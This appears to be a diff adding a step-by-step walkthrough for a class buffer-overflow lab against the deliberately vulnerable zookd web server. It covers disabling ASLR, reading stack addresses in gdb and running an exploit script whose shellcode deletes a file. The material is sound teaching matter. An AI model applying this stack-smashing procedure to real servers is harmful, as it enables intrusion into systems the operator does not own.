@@ -1,0 +1,30 @@
+1. Build everything
+      - cd ~/Desktop/Advanced_cyber/lab/lab
+      - make shellcode.bin
+  2. Start vulnerable server (terminal #1)
+      - setarch $(uname -m) -R ./zookd-exstack 8080
+      - Leave it running.
+  3. Grab stack addresses (terminal #2)
+      - gdb -p $(pgrep zookd-)
+      - Inside gdb:
+
+        set follow-fork-mode child
+        break http_request_headers
+        continue
+      - Trigger once from terminal #3: curl localhost:8080
+      - When gdb breaks:
+
+        info frame           # note saved RIP → STACK_RETADDR
+        print &value         # note buffer base → STACK_BUFFER
+        detach
+        quit
+      - Update those constants near the top of exploit-template.py if they changed.
+  4. Run exploit loop (terminal #3)
+      - touch /home/student/password.txt
+      - ./exploit-template.py localhost 8080
+      - When the script hangs waiting for a reply, hit Ctrl+C.
+  5. Verify effect
+      - ls /home/student/password.txt should say “No such file or directory.”
+      - For another demo, repeat step 4 (re‑touch the file each time).
+
+  That’s the exact flow you can follow live in class.
